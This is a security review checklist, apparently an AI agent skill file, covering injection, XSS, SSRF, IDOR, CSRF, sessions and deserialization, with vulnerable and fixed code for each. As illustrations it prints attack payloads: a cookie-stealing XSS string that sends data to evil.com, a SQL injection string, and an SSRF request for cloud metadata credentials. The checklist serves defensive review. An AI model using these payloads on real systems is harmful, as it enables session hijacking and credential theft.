---
name: security-review-checklist
description: An OWASP-style sweep of a PR or release — injection, XSS, SSRF, IDOR, CSRF, insecure deserialization — as an explicit checklist, each item paired with an exploit and its mitigation, delegating the deep areas to the dedicated skills (auth-patterns, dependency-audit, secrets-management, input-validation, multi-tenant-isolation-audit). Use when the user asks for a security review, an OWASP checklist, a vulnerability audit, or mentions injection, XSS, SSRF, IDOR, CSRF. The native `/security-review` sweeps the branch and finds what it finds; this is the route that guarantees no class went unexamined.
---

# Security Review Checklist

A security review checklist for code and PRs, organised by vulnerability class
rather than by stack. The exploit and the mitigation look different in Next.js,
NestJS, Python, Java, Go, Ruby or .NET; the audit question — "does hostile data
reach here unguarded?" — does not.

It crosses `input-validation` (injection and XSS start with unvalidated data at
the boundary), `multi-tenant-isolation-audit` (cross-tenant IDOR has its own,
deeper skill), `auth-patterns` (authentication and session failures likewise),
`dependency-audit` (vulnerable dependencies likewise) and `secrets-management`
(exposed secrets likewise). What belongs here is the broad sweep of a PR review.

## How to review

1. Identify every boundary in the diff that receives hostile data: HTTP request,
   query parameter, header, cookie, upload, queue message, external API response,
   CLI input.
2. For each boundary, walk the categories below asking "is this particular flow
   affected?".
3. Where an item has no mitigation, report it with a concrete exploit rather than
   "this is insecure".
4. Not every category applies to every PR. Skip the ones with no surface, quickly.

## Injection (SQL / NoSQL / command / LDAP)

External data becomes part of an interpreted command — a query, a shell line, an
LDAP filter — instead of staying data.

```
❌ query = "SELECT * FROM users WHERE email = '" + input + "'"
   input = "' OR '1'='1"  →  returns every user

✅ query = "SELECT * FROM users WHERE email = $1"; db.query(query, [input])
   -- parameterised: the input never becomes part of the command text
```

- [ ] Every query is parameterised or uses a prepared statement — never string concatenation or interpolation with external data
- [ ] The ORM or query builder has no escape hatch (`.raw()`, `$where`, a string template) receiving unsanitised input
- [ ] Shell commands (`exec`, `spawn`, `os.system`) never build arguments by concatenating input; they use an argument array or an allowlist
- [ ] LDAP and XPath filters escape special characters before the expression is assembled
- [ ] Database error messages are not passed raw to the client, since they leak schema and query shape

## Cross-Site Scripting (XSS)

External data is rendered as executable HTML or JS in another user's browser.

```
❌ <div dangerouslySetInnerHTML={{ __html: comment.text }} />
   comment.text = "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"

✅ <div>{comment.text}</div>  // JSX escapes by default
   // when real HTML is needed: sanitise with a tag allowlist (DOMPurify) first
```

- [ ] User data is rendered through the framework's automatic escaping (JSX, Blade `{{ }}`, Django autoescape); no `dangerouslySetInnerHTML`, `| safe` or `Html.Raw` without explicit sanitisation first
- [ ] Rich HTML sanitisation uses a tag and attribute allowlist from a dedicated library, never a hand-rolled regex
- [ ] Dynamic attributes (`href`, `src`, `style`) reject `javascript:` and `data:` from unvalidated input
- [ ] API responses that another context will interpret — JSON embedded in `<script>`, HTML email — are escaped for that context, not just for HTML
- [ ] Session cookies are `HttpOnly`, so an injected script cannot read the token even where XSS exists

## SSRF (Server-Side Request Forgery)

The server makes a network request to a destination the attacker controls, fully
or partly.

```
❌ const res = await fetch(req.body.imageUrl); // fetches an avatar from an arbitrary URL
   imageUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
   → leaks the cloud credentials

✅ validate the host against an allowlist before fetching, and block internal and
   link-local ranges (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, ::1) after DNS
   resolution, not just by inspecting the URL string
```

- [ ] Every function that fetches a user-supplied URL — outbound webhooks, image or link-preview fetching, import by URL — validates the host against an allowlist
- [ ] Host validation happens after DNS resolution, not on the string alone, which avoids bypass through redirects or DNS rebinding
- [ ] Internal and cloud-metadata ranges (link-local, loopback, RFC1918) are blocked by default for that kind of call
- [ ] HTTP redirects (3xx) on outbound requests are not followed blindly outside the allowlist
- [ ] Timeouts and response size limits are configured, so the server cannot be used as an exfiltration proxy or a DoS amplifier

## IDOR / broken access control

A resource is addressed by a predictable id and the server never checks whether
the caller may have it. See `multi-tenant-isolation-audit` for the cross-tenant
and cross-owner case.

```
❌ GET /api/invoices/42  →  returns invoice 42 to any authenticated user
   (authentication checked; authorization over that specific resource, not)

✅ GET /api/invoices/42  →  the handler loads the invoice AND checks
   invoice.ownerId === session.userId before returning, else 403/404
```

- [ ] Every endpoint taking a resource id checks the authenticated user's ownership or permission over that specific resource, not merely that they are logged in
- [ ] Predictable sequential ids are not the only barrier — trying `id+1` and `id-1` while authenticated as another user is part of the test
- [ ] Write actions (update, delete) repeat the same ownership check as reads; checking only on GET is the common gap
- [ ] Authorization is verified in the backend or through RLS, never inferred from a hidden button
- [ ] A role change at runtime — a plan upgrade, an admin toggle — invalidates the old session or token carrying the previous permissions

## CSRF

A state-changing action — password change, transfer, delete — executed through a
request forged from another site, riding the user's authenticated session.

```
❌ <form action="/api/transfer" method="POST"> validates only the session cookie
   → a malicious site posts the same form from the victim's logged-in browser

✅ Requires a CSRF token, or a custom header the browser will not replicate
   cross-origin, validated server-side on every mutation
```

- [ ] Every cookie-authenticated state-changing route (POST/PUT/PATCH/DELETE) requires a CSRF token or an equivalent server-checked custom header
- [ ] Session cookies use `SameSite=Lax` or `Strict` as an additional layer
- [ ] APIs authenticated by an `Authorization: Bearer` header rather than cookies are documented as outside this risk — CSRF depends on a credential the browser attaches automatically

## Authentication and session

```
❌ A session token in localStorage, with no expiry and no rotation after login
❌ A login error distinguishing "user does not exist" from "wrong password" (enumeration)
✅ Sessions expire, are invalidated on logout and password change, and login errors are generic
```

- [ ] Login errors do not reveal whether the user exists — a generic "invalid credentials"
- [ ] Rate limiting or backoff on login, password reset and 2FA endpoints
- [ ] Session tokens expire, and are invalidated on logout and on password change
- [ ] Password reset uses a single-use, unpredictable token with a short expiry
- [ ] Passwords are never logged, in plain text or inside an error or stack trace

## Deserialization and uploads

```
❌ pickle.loads(request_body)  // deserialising an arbitrary object from the client
   → code execution on a malicious payload

✅ The wire format is plain, schema-validated data (JSON), never a language-native
   serialized object; native deserialisers (pickle, Java Serializable, PHP
   unserialize) never receive client input without a type allowlist
```

- [ ] External payloads never reach a language-native deserialiser (pickle, `unserialize`, `ObjectInputStream`, `BinaryFormatter`) without a type allowlist
- [ ] Uploads validate the real type (magic bytes) and are stored outside the publicly served directory — see `input-validation`
- [ ] Upload filenames are normalised or generated by the server, never taken raw from the client, which blocks `../../` path traversal

## Configuration and dependencies

```
❌ A full stack trace, framework version and environment variables in an error response
❌ A dependency with a known CVE and no upgrade process
✅ A generic error to the client, full detail only in internal logs
✅ Dependency scanning (SCA) in CI, with a policy for critical CVEs
```

- [ ] Production error responses expose no stack trace, framework or library version, or environment variable
- [ ] Secrets (API keys, connection strings, the JWT secret) come from environment variables or a secret manager, never hardcoded in the repository
- [ ] Dependency scanning (SCA) runs in CI, with a defined process for critical CVEs
- [ ] Security headers are configured at the HTTP entry point (CSP, `X-Content-Type-Options`, `Strict-Transport-Security`)
- [ ] CORS never combines `Access-Control-Allow-Origin: *` with `Allow-Credentials: true`

## Anti-patterns

- ❌ Concatenating or interpolating input into a query, a shell command or an LDAP filter instead of parameterising
- ❌ `dangerouslySetInnerHTML`, `| safe` or `Html.Raw` on user data with no allowlist sanitisation
- ❌ Fetching a client-supplied URL without an allowlist and without blocking internal and metadata addresses
- ❌ Checking only authentication ("are they logged in?") and never authorization ("may they have THIS resource?") on an endpoint taking an id
- ❌ A cookie-authenticated mutation route with no CSRF token and no `SameSite`
- ❌ A login or signup error revealing whether the user exists
- ❌ Deserialising a language-native object from a client payload
- ❌ Exposing a stack trace, a dependency version or an environment variable in a production error
- ❌ A secret hardcoded in source instead of an environment variable or secret manager
- ❌ CORS with a wildcard origin alongside credentials
- ❌ Relying only on a manual `ownerId` check in code when the database (RLS) could guarantee isolation at the source

## By stack

**Next.js/React, or Vite + Supabase (XSS and SSRF):**
```tsx
// ❌ renders comment HTML unsanitised
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
// ✅ sanitise against an allowlist first
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(comment.body, allowedTags) }} />

// a link-preview route handler validating the host before fetching
const url = new URL(input);
if (!isAllowedHost(url.hostname) || isPrivateIp(await resolve(url.hostname))) {
  return Response.json({ error: 'host not allowed' }, { status: 400 });
}
```

**NestJS/TypeORM (injection and IDOR):**
```ts
// ✅ parameterised through the query builder, never a concatenated string
await this.repo.createQueryBuilder('invoice')
  .where('invoice.id = :id AND invoice.ownerId = :ownerId', { id, ownerId: user.id })
  .getOne(); // ownerId always from the session, never from the parameter — IDOR and injection at once
```

**Supabase/Postgres (IDOR solved by RLS rather than a manual check):**
```sql
-- ✅ the policy resolves IDOR at the database level, so the endpoint need not check ownerId by hand
CREATE POLICY "owner_own_invoices" ON invoices
  FOR SELECT TO authenticated
  USING (owner_id = auth.uid());
```

**Python/Django (SSRF and deserialization):**
```python
# ❌ pickle on a client payload
data = pickle.loads(request.body)

# ✅ JSON validated by a schema (Pydantic, a DRF serializer), no native deserialiser
data = WebhookPayload(**json.loads(request.body))

# SSRF: validate the resolved host, not just the URL string
import socket, ipaddress
ip = socket.gethostbyname(urlparse(target).hostname)
if ipaddress.ip_address(ip).is_private:
    raise ValidationError("internal host blocked")
```
